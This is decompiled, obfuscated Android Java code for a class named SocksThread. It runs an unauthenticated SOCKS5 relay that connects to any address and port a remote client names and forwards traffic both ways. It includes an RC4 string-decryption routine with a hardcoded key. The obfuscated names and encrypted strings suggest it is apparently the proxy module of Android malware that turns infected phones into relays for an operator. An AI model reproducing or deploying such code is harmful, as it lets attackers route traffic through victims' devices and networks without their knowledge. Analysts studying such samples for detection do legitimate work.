package com.example.mmm.API;

import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.Utils.utils;
import com.example.mmm.unmapped.Hollyanne;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public final class SocksThread implements Runnable {
   constants central$ = new constants();
   utils house$ = new utils();
   private Socket opposite$;
   private int villages$ = 102400;

   public SocksThread(Socket var1) {
      this.opposite$ = var1;
   }

   private String _french(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   public final void run() {
      InputStream var2 = this.opposite$.getInputStream();
      OutputStream var4 = this.opposite$.getOutputStream();
      byte[] var3 = new byte[this.villages$];
      var2.read(var3, 0, 3);
      var4.write(new byte[]{5, 0});
      var4.flush();
      var2.read(var3, 0, 10);
      StringBuilder var5 = new StringBuilder();
      var5.append(var3[4] & 255);
      var5.append(".");
      var5.append(var3[5] & 255);
      var5.append(".");
      var5.append(var3[6] & 255);
      var5.append(".");
      var5.append(var3[7] & 255);
      Socket var6 = new Socket(var5.toString(), (var3[8] & 255) * 256 + (var3[9] & 255));
      InputStream var7 = var6.getInputStream();
      OutputStream var10 = var6.getOutputStream();
      byte[] var8 = var6.getLocalAddress().getAddress();
      int var1 = var6.getLocalPort();
      var4.write(new byte[]{5, 0, 0, 1, var8[0], var8[1], var8[2], var8[3], (byte)(var1 >> 8), (byte)(var1 & 255)}, 0, 10);
      var4.flush();
      (new Hollyanne(var7, var4)).start();
      ByteArrayOutputStream var9 = new ByteArrayOutputStream();

      while(true) {
         var1 = var2.read(var3, 0, this.villages$);
         if (var1 <= 0) {
            if (this.opposite$ != null) {
               this.opposite$.close();
            }

            return;
         }

         var10.write(var3, 0, var1);
         var9.write(var3, 0, var1);
         var10.flush();
      }
   }
}
